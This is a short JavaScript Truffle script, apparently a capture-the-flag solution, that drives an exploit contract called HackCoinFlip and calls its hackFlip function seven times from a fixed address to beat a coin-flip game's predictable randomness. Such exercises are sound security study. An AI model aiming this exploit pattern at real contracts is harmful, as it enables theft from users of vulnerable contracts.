var HackCoinFlip = artifacts.require("./CoinFlip/HackCoinFlip.sol");

const fromAddress = "0x55c369b3e32fAbb7bfdA6A1D86FEeFdb19bBb7aF";

module.exports = async (callback) => {
    let hackCoinFlip = HackCoinFlip.at("0xb939adb279ef07959f5c8eee4a7c1dfedf5e7706");

    for (let i = 0; i < 7; i++) {
        let result = await hackCoinFlip.hackFlip({from: fromAddress});
    }
};
